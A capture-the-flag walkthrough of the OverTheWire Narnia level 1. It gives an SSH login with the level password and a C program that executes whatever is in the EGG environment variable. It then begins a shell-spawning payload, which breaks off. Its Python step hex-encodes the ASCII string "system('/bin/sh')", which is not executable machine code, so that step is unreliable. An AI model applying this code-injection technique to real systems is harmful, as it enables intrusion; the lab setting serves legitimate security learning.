<h1>Narnia 1 &#x2192; Narnia 2 </h1>

<p>There is no information for this level, intentionally.</p>

```bash
user@host:~$ ssh narnia1@narnia.labs.overthewire.org -p 2226
efeidiedae
```

Just like in level 0 we will navigate to the `/narnia` directory, as there were some programs for each level. Let us first take a look at the program `narnia1`:

```bash
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```

The source code for the program is (excluding the licensing information):

```c
narnia1@narnia:/narnia$ cat narnia1.c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

The program will try to execute whatever is in the environment variable `EGG`. Currently, that variable is NULL.

```sh
narnia1@narnia:/narnia$ echo $EGG

```

Let us try to spawn a shell by exporting `system('/bin/sh')` as bytes into `EGG`. Again, we can use python to do this.

``` python
egg: str = "\\x" + "\\x".join(f"{b:x}" for b in b"system('/bin/sh')")
print(egg)
>>> '\x73\x79\x73\x74\x65\x6d\x28\x27\x2f\x62\x69\x6e\x2f\x73\x68\x27\x29'
```
